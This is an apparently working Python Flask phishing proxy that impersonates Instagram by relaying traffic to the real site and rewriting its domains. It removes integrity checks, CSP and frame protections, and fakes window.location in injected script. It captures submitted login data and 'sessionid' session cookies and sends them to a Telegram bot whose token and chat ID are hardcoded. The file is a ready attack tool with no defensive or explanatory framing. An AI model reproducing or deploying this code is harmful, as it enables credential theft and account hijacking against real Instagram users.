import os, re, json, urllib3, requests
from flask import Flask, request, make_response
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

a = Flask(__name__)
a.secret_key = os.urandom(32).hex()

T = os.environ.get("T_BOT", "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc")
C = os.environ.get("T_CHAT", "1367401179")

class X:
    def __init__(self):
        self.d = "www.instagram.com"
        self.p = ["www.instagram.com", "instagram.com", "static.cdninstagram.com", "scontent.cdninstagram.com", "www.facebook.com", "facebook.com"]

    def n(self, m):
        try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"}, timeout=5)
        except: pass

    def s(self, t, h):
        for d in self.p:
            t = t.replace(f"https://{d}", f"https://{h}")
            t = t.replace(f"//{d}", f"//{h}")
        t = re.sub(r'integrity="[^"]+"', '', t)
        t = t.replace('Content-Security-Policy', 'X-CSP')
        if '<head>' in t:
            j = f"<script>Object.defineProperty(window.location,'hostname',{{get:()=>'{self.d}'}});Object.defineProperty(window.location,'host',{{get:()=>'{self.d}'}});Object.defineProperty(window.location,'origin',{{get:()=>'https://{self.d}'}});</script>"
            t = t.replace('<head>', f'<head>{j}')
        return t

e = X()

@a.route('/', defaults={'p': ''})
@a.route('/<path:p>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def g(p):
    h = request.headers.get('Host', '').split(':')[0]
    u = urljoin(f"https://{e.d}", p)
    if request.query_string: u += '?' + request.query_string.decode()

    H = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
    H['Host'] = e.d

    if request.method == 'POST':
        d = request.form.to_dict() or request.get_json(silent=True) or {}
        if d: e.n(f"🔐 <b>Login:</b>\n<pre>{json.dumps(d, indent=2)}</pre>")

    try:
        r = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=20)
        b = r.content
        if any(x in r.headers.get('Content-Type', '') for x in ['html', 'javascript', 'json']):
            try: b = e.s(b.decode('utf-8', errors='ignore'), h).encode()
            except: pass

        o = make_response(b)
        o.status_code = r.status_code
        for k, v in r.headers.items():
            if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'x-frame-options']:
                o.headers[k] = v
        for k, v in r.cookies.items():
            o.set_cookie(k, v, domain=h, secure=True, httponly=True, samesite='Lax')
        if 'sessionid' in r.cookies:
            e.n(f"🔥 <b>Session:</b>\n<code>{json.dumps(r.cookies.get_dict())}</code>")
        if r.status_code in [301, 302, 303, 307, 308]:
            l = r.headers.get('Location', '').replace(e.d, h)
            o.headers['Location'] = l
        return o
    except: return "Error", 503

if __name__ == '__main__':
    a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
